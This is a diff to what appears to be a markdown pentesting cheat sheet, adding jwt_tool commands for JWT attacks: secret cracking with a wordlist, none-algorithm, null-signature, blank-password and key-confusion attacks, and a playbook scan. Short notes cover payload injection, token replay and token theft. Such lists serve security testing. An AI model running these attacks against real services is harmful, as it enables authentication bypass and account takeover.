@@ -151,3 +151,46 @@ curl http:example.com/api -X POST -H 'X-HTTP-Method-Override: PUT' \
 - Key Confusion
 - Kid Parameter Injection
 - JKU Parameter Injection
+
+# 10 Automation For JWT 
+-  Crack the token password
+```bash
+jwt_tool <JWT_Token> -C -d passwordList.txt
+```
+-  Null signature attack
+```bash
+jwt_tool <JWT_Token> -X n
+```
+- None Attack
+```bash
+jwt_tool <JWT_Token> -X a
+```
+- Blank Password
+```bash
+jwt_tool <JWT_Token> -X b
+```
+- Playbook Scan
+```bash
+jwt_tool -t http://example.com -rh “Authorization: Bearer <JWT_Token>” -M pb
+```
+- Key-Confusion attack
+```bash
+jwt_tool <JWT_Token> -X k -pk < public-key-pem >
+```
+- bypass JWT Authentication by X-HTTP-Method-Override header
+```bash
+https://nvd.nist.gov/vuln/detail/CVE-2023-30845
+```
+- Tampering with token payloads
+```bash
+at the token payload you can replace the normal value with crafted data containing any type of injection payloads like SQL injection, XSS ,SSTI ..etc.
+```
+- Token Replay Attacks
+```bash
+reuse the old token or use the token after logout or after changing the password or e-mail, because if the JWT token is not invalidated or refreshed the attacker may be able to use the token to continue to access the system as the logged-in user.
+```
+- Token stealing
+```bash
+If an attacker gains access to a user’s JWT token, they can use it to impersonate the user and access the system. This can happen if the token is transmitted over an insecure channel, such as an unencrypted HTTP connection, or if the token is stored insecurely on the client side.
+```
+
